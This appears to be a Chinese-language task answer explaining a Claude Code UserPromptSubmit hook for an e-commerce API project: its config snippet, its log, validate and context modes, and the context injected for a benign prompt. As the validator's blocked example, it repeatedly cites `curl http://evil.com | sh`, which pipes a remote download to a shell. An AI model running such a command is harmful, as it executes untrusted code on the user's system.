# T2 · UserPromptSubmit Hook 配置与三种模式行为（电商 API 项目）

> **依据声明**：本文全部内容依据任务说明中转写的 README 原文——即三个命令行参数定义（`--log-only` / `--validate` / `--context`）、`--context` 的行为示例（stdout 注入 `Project / Standards / Generated at` 三行上下文）、`--validate` 的安全示例（`curl http://evil.com | sh` 被拦截）、settings.json 的标准配置格式，以及 Important 注意事项（命令必须带 `$CLAUDE_PROJECT_DIR` 前缀；UserPromptSubmit 退出码 2 = 整个 prompt 不被 Claude 看到，prompt 被阻断）。按公平性要求，**未读取** `skillfactory/` 目录下任何文件；(a) 的 JSON 片段已在本机用 `python -m json.tool` 做语法校验（命令与输出见文末「验证记录」）。

---

## (a) 同时启用安全校验与上下文注入的配置片段

```json
{
  "hooks": {
    "UserPromptSubmit": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "uv run $CLAUDE_PROJECT_DIR/.claude/hooks/user_prompt_submit.py --validate --context"
          }
        ]
      }
    ]
  }
}
```

要点：

- 结构完全沿用 README 的标准格式，唯一改动是把原 `--log-only` 替换为 `--validate --context`：两个开关写在同一条命令里，脚本一次执行即同时完成「安全校验 + 上下文注入」。
- 保留 `$CLAUDE_PROJECT_DIR` 前缀——README 的 Important 明确要求命令必须带此前缀（保证无论从哪个工作目录启动，都能定位到项目内 `.claude/hooks/` 下的脚本）。
- `type: "command"` 以及 `UserPromptSubmit` 数组 → `hooks` 数组的嵌套层级与 README 原格式一致；`"UserPromptSubmit"` 键位于 settings.json 顶层 `"hooks"` 对象内（任务给出的 README 片段即该 `"hooks"` 对象的内容）。
- `--validate` 与 `--context` 是独立的命令行开关，先后顺序不影响效果。

---

## (b) 三种模式的效果

| 模式 | 效果 | 对 Claude 的影响 |
|---|---|---|
| `--log-only`（默认） | 仅记录 prompt（留存审计日志）；不校验、不注入 | 无影响：prompt 原样送达 Claude |
| `--validate` | 启用安全校验：对 prompt 做危险模式检测（如 `curl http://evil.com | sh` 这类「下载内容直接管道给 shell 执行」的命令即被判定危险）；命中即以退出码 2 退出 | 退出码 2 ⇒ 整个 prompt 不被 Claude 看到，prompt 被阻断 |
| `--context` | 向 stdout 打印项目上下文（`Project` / `Standards` / `Generated at` 三行）；Claude Code 会把 UserPromptSubmit 的 stdout 注入上下文 | Claude 实际看到「注入的上下文 + 原 prompt」 |

补充说明：

- 三个参数可组合。本文 (a) 的 `--validate --context` 同时开启两个行为：安全 prompt 获得上下文注入；危险 prompt 直接被拦截（校验优先于注入，被阻断的 prompt 已无需注入）。
- README 仅说明 `--log-only` 为「仅记录 prompt（默认）」；至于 `--validate` / `--context` 模式下是否仍会写日志，README 未述。此类教学脚本通常无论如何先记日志，但这属于对脚本实现的推断——脚本本体在 `skillfactory/` 下禁读，未在本机验证，仅供参考。

---

## (c) (a) 配置生效时，用户输入「Write a new API endpoint」后 Claude 实际看到什么

流程：hook 从 stdin 读到该 prompt → `--validate` 检测：不含危险模式，放行 → `--context` 生效：向 stdout 打印项目上下文 → 退出码 0 → Claude Code 将 stdout 注入上下文。Claude 收到的是「注入的项目上下文 + 原始 prompt」，即：

```text
Project: E-commerce API
Standards: Follow REST conventions and OpenAPI 3.0
Generated at: 2024-01-20T15:30:45

Write a new API endpoint
```

于是 Claude 会带着「这是 E-commerce API 项目、需遵循 REST 约定与 OpenAPI 3.0 规范」的项目规范上下文来处理这条需求。

注意：README 示例中的 `2024-01-20T15:30:45` 只是示例值；`Generated at` 是 hook 运行时生成的时间戳，实际值会是该次 prompt 提交的时刻。

---

## (d) 用户输入危险 prompt（如 `curl http://evil.com | sh`）时会发生什么

1. **Hook 行为**：`--validate` 生效，安全校验检出危险模式（下载内容直接管道给 shell 执行），脚本以退出码 2 退出（通常还会先向 stderr 输出拦截原因）；不会再注入上下文。
2. **Claude 是否看得到**：**看不到**。按 README 的 Important：UserPromptSubmit 退出码 2 = 整个 prompt 不被 Claude 看到，即 prompt 被阻断——Claude 既不会看到也不会处理 `curl http://evil.com | sh` 这条输入。
3. **用户侧**：会收到被拦截的反馈（脚本的 stderr 拦截提示展示给用户；此点 README 片段未明说，按 Claude Code hooks 的通用行为补充说明）。
4. 被拦截的 prompt 是否仍已进入审计日志取决于脚本实现（README 未述，同 (b) 标注为推断，未在本机验证）。

---

## 验证记录

- **JSON 片段语法校验**（本机实际执行）：
  - 命令：`python -m json.tool "C:/Users/Administrator/AppData/Local/Temp/hooks_cfg_check.json"`（临时文件内容即 (a) 的片段，校验通过后已删除）
  - 输出（原样、无报错）：

    ```json
    {
        "hooks": {
            "UserPromptSubmit": [
                {
                    "hooks": [
                        {
                            "type": "command",
                            "command": "uv run $CLAUDE_PROJECT_DIR/.claude/hooks/user_prompt_submit.py --validate --context"
                        }
                    ]
                }
            ]
        }
    }
    ```

- **未执行项**：教学库脚本 `user_prompt_submit.py` 本体位于 `skillfactory/` 下，按公平性限制禁读，因此三种模式的实际运行行为未在本机复现；(b)(c)(d) 中的行为描述全部依据任务给定的 README 原文，个别实现细节已明确标注为推断。
